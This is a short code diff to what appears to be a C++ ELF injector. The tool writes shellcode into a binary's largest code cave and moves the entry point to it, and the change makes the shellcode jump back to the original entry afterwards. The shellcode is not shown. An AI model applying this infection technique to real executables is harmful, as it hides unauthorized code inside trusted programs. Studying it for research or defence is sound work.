@@ -13,7 +13,9 @@ void inject(Elf_target &elf) {
   }
 
   const auto code_cave = elf.find_biggest_code_cave();
-  const auto shellcode = shellcode::make_shellcode();
+  const auto new_entry_point = elf.get_text_segment_offset() + code_cave.offset;
+  const auto shellcode =
+      shellcode::make_shellcode(new_entry_point - elf.entry_point());
 
   if (code_cave.size < shellcode.size()) {
     throw runtime_error{"can't find a big enough code cave"};
@@ -21,8 +23,7 @@ void inject(Elf_target &elf) {
 
   elf.write_shellcode(shellcode, code_cave);
 
-  auto text_offset = elf.get_text_segment_offset();
-  elf.change_entry_point(text_offset + code_cave.offset);
+  elf.change_entry_point(new_entry_point);
 }
 
 } // namespace injector
